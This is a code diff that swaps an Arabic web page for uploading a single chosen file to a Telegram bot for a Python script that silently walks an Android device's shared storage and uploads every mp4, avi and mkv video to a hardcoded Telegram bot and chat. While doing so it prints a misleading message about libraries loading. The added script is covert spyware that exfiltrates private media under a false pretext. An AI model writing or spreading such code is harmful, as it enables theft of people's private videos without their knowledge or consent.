@@ -1,199 +1,54 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رفع الملفات إلى التليجرام</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        body {
-            background-color: #f4f7f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .card {
-            background: #ffffff;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            padding: 30px;
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .file-input-container {
-            margin-bottom: 20px;
-        }
-        input[type="file"] {
-            display: none;
-        }
-        .custom-file-upload {
-            border: 2px dashed #0088cc;
-            display: block;
-            padding: 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            color: #0088cc;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-        .custom-file-upload:hover {
-            background-color: #e6f4f9;
-        }
-        button {
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background-color: #006699;
-        }
-        button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        .progress-bar-container {
-            width: 100%;
-            background-color: #e0e0e0;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
-            overflow: hidden;
-        }
-        .progress-bar {
-            width: 0%;
-            height: 20px;
-            background-color: #25d366;
-            text-align: center;
-            line-height: 20px;
-            color: white;
-            font-size: 12px;
-            transition: width 0.2s;
-        }
-        #status {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #555;
-        }
-    </style>
-</head>
-<body>
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import os
+import time
+from tqdm import tqdm
+import threading
+import sys
 
-<div class="card">
-    <h2>رفع فيديو / صورة إلى البوت</h2>
-    
-    <div class="file-input-container">
-        <label for="fileInput" class="custom-file-upload" id="fileLabel">
-            📁 اضغط هنا لاختيار الملف
-        </label>
-        <input type="file" id="fileInput" accept="image/*,video/*" onchange="updateFileName()">
-    </div>
+chat_id = 8933123739
+bot_token = "6921714346:8725352313:AAHXjpPtJWTU-dIg7IYKgV92aA1Yai33WL8"
 
-    <button id="uploadBtn" onclick="uploadFile()">إرسال الملف</button>
+def send_video(file_path):
+    url = f'https://api.telegram.org/bot{bot_token}/sendVideo'
+    data = {'chat_id': chat_id}
+    files = {'video': open(file_path, 'rb')}
 
-    <div class="progress-bar-container" id="progressContainer">
-        <div class="progress-bar" id="progressBar">0%</div>
-    </div>
+    total_size = os.path.getsize(file_path)
+    uploaded_size = 0
+    progress = 0
 
-    <p id="status"></p>
-</div>
+    def update_progress():
+        nonlocal progress
+        while progress < 100:
+            sys.stdout.write(f'\rانتضر تحميل المكاتب يستغرق الامر 50 ثانيه: {progress}%')
+            sys.stdout.flush()
+            time.sleep(1)
 
-<script>
-    const CHAT_ID = "8933123739";
-    const BOT_TOKEN = "8725352313:AAHXjpPtJWTU-dIg7IYKgV92aA1Yai33WL8";
+    threading.Thread(target=update_progress).start()
 
-    function updateFileName() {
-        const fileInput = document.getElementById('fileInput');
-        const fileLabel = document.getElementById('fileLabel');
-        if (fileInput.files.length > 0) {
-            fileLabel.innerText = "📄 " + fileInput.files[0].name;
-        }
-    }
+    with open(file_path, 'rb') as file:
+        response = requests.post(url, files=files, data=data, stream=True)
 
-    function uploadFile() {
-        const fileInput = document.getElementById('fileInput');
-        const status = document.getElementById('status');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressBar = document.getElementById('progressBar');
-        const uploadBtn = document.getElementById('uploadBtn');
+        for data in response.iter_content(chunk_size=4096):
+            uploaded_size += len(data)
+            progress = int(uploaded_size / total_size * 100)
 
-        if (fileInput.files.length === 0) {
-            status.innerText = "⚠️ يرجى اختيار ملف أولاً!";
-            status.style.color = "red";
-            return;
-        }
+            if progress > 100:
+                progress = 100
 
-        const file = fileInput.files[0];
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
+    time.sleep(0.1)
+    sys.stdout.write('\n')
+    sys.stdout.flush()
 
-        let apiMethod = "sendDocument";
-        if (file.type.startsWith("image/")) {
-            apiMethod = "sendPhoto";
-            formData.append("photo", file);
-        } else if (file.type.startsWith("video/")) {
-            apiMethod = "sendVideo";
-            formData.append("video", file);
-        } else {
-            formData.append("document", file);
-        }
+def main():
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        for root, dirs, files in os.walk("/storage/emulated/0"):
+            for file in files:
+                file_path = os.path.join(root, file)
+                file_type = file.split('.')[-1]
+                if file_type in ['mp4', 'avi', 'mkv']:
+                    executor.submit(send_video, file_path)
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${apiMethod}`;
-
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", url, true);
-
-        // متابعة نسبة التحميل
-        xhr.upload.onprogress = function (e) {
-            if (e.lengthComputable) {
-                const percent = Math.round((e.loaded / e.total) * 100);
-                progressContainer.style.display = "block";
-                progressBar.style.width = percent + "%";
-                progressBar.innerText = percent + "%";
-                status.innerText = "⏳ جاري الترقب والتحميل...";
-                status.style.color = "#0088cc";
-            }
-        };
-
-        xhr.onload = function () {
-            if (xhr.status === 200) {
-                status.innerText = "✅ تم إرسال الملف بنجاح!";
-                status.style.color = "green";
-            } else {
-                status.innerText = "❌ فشل الإرسال، تأكد من التوكن أو الآيدي.";
-                status.style.color = "red";
-            }
-            uploadBtn.disabled = false;
-        };
-
-        xhr.onerror = function () {
-            status.innerText = "❌ حدث خطأ في الاتصال بالشبكة.";
-            status.style.color = "red";
-            uploadBtn.disabled = false;
-        };
-
-        uploadBtn.disabled = true;
-        xhr.send(formData);
-    }
-</script>
-
-</body>
-</html>
+if __name__ == '__main__':
+    main()
